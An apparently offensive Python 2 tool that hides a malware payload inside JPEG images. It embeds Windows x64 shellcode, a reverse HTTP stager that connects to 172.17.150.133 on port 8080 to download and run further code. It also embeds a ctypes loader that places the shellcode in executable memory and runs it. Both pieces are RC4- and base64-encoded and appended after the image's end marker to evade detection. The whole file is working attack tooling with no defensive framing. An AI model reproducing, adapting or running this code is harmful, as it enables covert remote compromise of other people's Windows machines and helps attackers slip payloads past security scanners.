'''#!/usr/bin/env python2.7'''
# -*- coding: utf-8 -*-
import hashlib,base64,sys,os

shellcode = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x90\x1f\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x72\x72\x34\x45\x00\x68\x52\x63\x94\x0c\x3a\x1b\xcc\x0b\x56\x49\xea\x70\x61\xa7\x3b\x98\x4b\x43\x82\x6e\xa6\x00\xa8\x93\xcd\x51\xf4\xbc\xa0\x73\x15\x87\xcb\x09\xdb\x37\xad\x60\xab\xa1\x82\xa3\x34\xb6\x27\xd3\xeb\x08\x7e\x88\xa6\x1e\x87\x94\x05\x7b\xdb\x5b\xf0\x94\xa2\x80\x5b\x94\x3c\xe2\x60\x5c\xd0\xca\x29\xe5\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x30\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\x0d\xeb\xe9\xd9\x34\x0f\xeb\x46\x4e\x19\x76\xf9\x98\x19\x92\xe3\xe6\xcd\x9a\xee\x64\x90\x8e\x75\x6f\x62\x77\x2a\x68\x29\xa4\xf0\x35\x39\xf9\x00\x63\xf3\x6f\x08\x5c\x20\x52\x5d\x24\x1a\x8b\x1b\x97\x0f\xa2\x94\xc2\x8d\x3a\x5d\xbc\x58\xcc\xd3\x67\x40\x80\x76\x7d\x9a\x7e\x59\x03\x74\xfe\xac\xde\x95\xd9\x56\x1a\xca\xd5\xf2\xd9\xf8\x52\x2a\x88\x20\x8c\x9f\x69\xaa\x02\x87\x0b\x31\xa9\x19\xd0\x51\x62\x0c\x8f\x68\x8f\x35\x87\x45\xe8\xda\x53\x88\xee\x56\x0d\x23\xdd\xe2\x78\x98\xfc\xe3\xce\x1e\xd4\x3d\xe4\xd8\x52\x95\xc5\xb2\xf2\xbb\xd6\x0d\xf9\x7b\x76\xef\x0c\x2a\xc4\x27\x25\xf3\x5b\xb6\x80\x39\x5e\x66\x6d\x77\xd8\x3b\xaa\x71\x8f\x8d\x3c\x21\x54\xf8\x12\xbe\xd0\x5c\x3d\x0c\x0c\xe5\x88\x38\x89\xcc\xa0\xf4\xe5\x51\xca\x1a\xca\x1d\x9a\x50\xe0\xd6\x0d\x26\x21\x80\xac\xf4\x09\x7d\xb3\x91\x53\x81\x25\x19\xc6\x63\xd1\x97\x51\x9f\xd6\xb0\x92\xe6\xde\x5f\xc3\x27\x06\x35\xa9\x85\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x37\x32\x2e\x31\x37\x2e\x31\x35\x30\x2e\x31\x33\x33\x00\x19\x69\xa0\x8d"
loader = "VirtualAlloc = windll.kernel32.VirtualAlloc;VirtualProtect=windll.kernel32.VirtualProtect;useless+=random.choice(useless);whnd=windll.kernel32.GetConsoleWindow();RtlMoveMemory=windll.kernel32.RtlMoveMemory;memHscode=VirtualAlloc(c_int(0),c_int(len(code)),c_int(0x3000),c_int(0x40));buf=(c_char*len(code)).from_buffer(code);useless+=random.choice(useless)[:-1];RtlMoveMemory(c_int(memHscode),buf,c_int(len(code)));runcode=cast(memHscode,CFUNCTYPE(c_void_p));runcode()"

def rc4(text,key):
    #Use md5(key) to get 32-bit key instead raw key
    key=hashlib.md5(key).hexdigest()
    result=''
    key_len=len(key)
    #1.init S-box
    box=list(range(256))#put 0-255 into S-box
    j=0
    for i in range(256):#shuffle elements in S-box according to key
        j=(j+box[i]+ord(key[i%key_len]))%256
        box[i],box[j]=box[j],box[i]#swap elements
    i=j=0
    for element in text:
        i=(i+1)%256
        j=(j+box[i])%256
        box[i],box[j]=box[j],box[i]
        k=chr(ord(element)^box[(box[i]+box[j])%256])
        result+=k
    result=base64.b64encode(result)
    return result

class Builder:
    def __init__(self):
        pass

    def shellcode(self,key,imgName):
        #base64encode
        baseStr=base64.b64encode(shellcode)
        #RC4+base64encode
        payload=rc4(baseStr,key)
        with open(imgName,'rb') as f:
            img=f.read()
            fileend=img[-2:]
            if(ord(fileend[0])!=255 and ord(fileend[0])!=217):
                if(img.count(chr(255)+chr(217))>0):
                    print("Please change the img.")
                    exit(0)
                else:
                    payload=img+chr(255)+chr(217)+payload
                    print("Abnormal end of file,auto add \xff\xd9")
            else:
                payload=img+payload
            with open("shellcode_"+imgName,'wb') as f1:
                f1.write(payload)
        print("Payload has write to shellcode_"+imgName)

    def loader(self,key,imgName):
        #base64encode
        baseStr=base64.b64encode(loader)
        #RC4+base64encode
        payload=rc4(baseStr,key)
        with open(imgName,'rb') as f:
            img=f.read()
            fileend=img[-2:]
            if(ord(fileend[0])!=255 and ord(fileend[0])!=217):
                if(img.count(chr(255)+chr(217))>0):
                    print("Please change the img.")
                    exit(0)
                else:
                    payload=img+chr(255)+chr(217)+payload
                    print("Abnormal end of file,auto add \xff\xd9")
            else:
                payload=img+payload
            with open("loader_"+imgName,'wb') as f1:
                f1.write(payload)
        print("Payload has write to loader_"+imgName)
    
def main():
    if len(sys.argv)!=3:
        print("Usage:python generator.py YourRC4Key imgName")
        exit(0)
    else:
        key=sys.argv[1]
        imgName=sys.argv[2]
        if(not os.path.exists(imgName) or os.path.getsize(imgName)<=200):
            print("check your img param!")
            exit(0)
    newscode=Builder()
    newscode.shellcode(key,imgName)
    newscode.loader(key,imgName)
    
if __name__=="__main__":
    main()